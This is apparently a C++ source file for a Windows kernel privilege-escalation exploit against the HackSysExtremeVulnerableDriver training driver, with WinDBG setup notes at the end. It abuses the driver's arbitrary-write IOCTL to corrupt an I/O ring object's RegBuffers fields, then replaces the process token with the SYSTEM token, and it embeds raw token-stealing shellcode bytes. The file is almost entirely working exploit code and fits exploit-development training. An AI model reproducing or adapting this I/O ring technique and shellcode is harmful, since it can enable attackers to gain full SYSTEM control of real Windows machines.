#include "ioring.h"
#include <iostream>
#include <cstdio>

#pragma comment(lib, "ntdll.lib")
#pragma comment (lib, "ws2_32.lib")

#define QWORD unsigned long long

typedef struct USER_CONTROLLED_OBJECT {
    LPVOID What;
    LPVOID Where;
};

HANDLE setupSocketHEVD() {

    // Open a handle to the target device
    HANDLE deviceHandle = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        //std::cout << "[-] Failed to open the device" << std::endl;
        return FALSE;
    }
    return deviceHandle;
}


BOOL arbitraryWrite(QWORD What, LPVOID Where){

    HANDLE sock = setupSocketHEVD();
    LPVOID outBuffer = { 0 };
    IO_STATUS_BLOCK ioStatusBlock = { 0 };
    DWORD ioctlCode = 0x22200B; //HEVD_IOCTL_ARBITRARY_WRITE

    printf("[+] WriteWhatWhere.What: 0x%llX\n", What);
    printf("[+] WriteWhatWhere.Where: 0x%llX\n", Where);

    USER_CONTROLLED_OBJECT WriteWhatWhere = { 0 };
    // Malicious user-controlled struct
    WriteWhatWhere.What = &What;
    WriteWhatWhere.Where = Where;

    // Sending [_IORING_OBJECT.RegBuffersCount] Arbitrary Write Primitive
    NtDeviceIoControlFile((HANDLE)sock, nullptr, nullptr, nullptr, &ioStatusBlock, ioctlCode, &WriteWhatWhere,
        sizeof(WriteWhatWhere), &outBuffer, NULL);

    return true;
}

int exploit() {

    // https://vulndev.io/2022/07/10/windows-kernel-exploitation-hevd-x64-type-confusion/
    BYTE sc[256] = {
      0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48,
      0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc0, 0x4d,
      0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xe8, 0x48,
      0x04, 0x00, 0x00, 0x4d, 0x8b, 0x88, 0x40, 0x04, 0x00, 0x00,
      0x49, 0x83, 0xf9, 0x04, 0x75, 0xe5, 0x49, 0x8b, 0x88, 0xb8,
      0x04, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8,
      0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01,
      0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66,
      0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48,
      0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68,
      0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00,
      0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa,
      0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48,
      0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

    // pre-allocaiting fakebuffer at [0x1000000]
    LPVOID pFakeRegBuffers = VirtualAlloc((LPVOID)0x1000000, sizeof(QWORD), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    memset(pFakeRegBuffers, 0, sizeof(QWORD));

    // + 0x0b0 RegBuffersCount  : Uint4B
    // + 0x0b8 RegBuffers : Ptr64 Ptr64 _IOP_MC_BUFFER_ENTRY
    QWORD IORING_OBJECT_ADDR = setupIORing();
    QWORD RegBuffersCount = IORING_OBJECT_ADDR + 0xb0;
    QWORD RegBuffers = IORING_OBJECT_ADDR + 0xb8;

    // Write 0x100 to RegBuffersCount
    printf("\n[!] Overwriting IORing->RegBuffersCount Object\n");
    QWORD RegBuffersCountValue = 0x1;
    arbitraryWrite(RegBuffersCountValue, (LPVOID)RegBuffersCount);
   
    // Prompt the user for input
    printf("\n[-] Waiting for any key #1...");
    getchar();

    // Write 0x1000000 to RegBuffers
    printf("\n[!] Overwriting IORing->RegBuffers Object\n");
    arbitraryWrite((QWORD)pFakeRegBuffers, (LPVOID)RegBuffers);

    printf("\n[+] IORING_STRUCT CORRUPTED WITH ARW!\n");
    
    // Prompt the user for input
    printf("\n[!] Waiting for any key #2....");
    getchar();

    // LPE attack by copying and replacing current process token with SYSTEM(4) one
    ioring_lpe(pFakeRegBuffers);

    // Cleaning up RegBuffers to avoid BSOD
    printf("\n[!] Cleaning up...");
    QWORD preventBSOD = 0x0;
    arbitraryWrite(preventBSOD, (LPVOID)RegBuffersCount);
    arbitraryWrite(preventBSOD, (LPVOID)RegBuffers);

    // Prompt the user for input
    printf("[!] Waiting for any key #3....");
    getchar();

    return 0;
}

/*
WinDBG:

    !sym noisy

    .sympath srv*c:\symbols;C:\HEVD
    .reload /f *.*
    ed nt!Kd_Default_Mask 0xf
    .load C:\windbg_ext\pykd.dll
    .cache flushall
    bp HEVD!TriggerArbitraryWrite+0xa6
    g

    dt *!*IORING*
    dt nt!_IORING_OBJECT


==============================================
int main() {
    exploit();
    return 0;
}
*/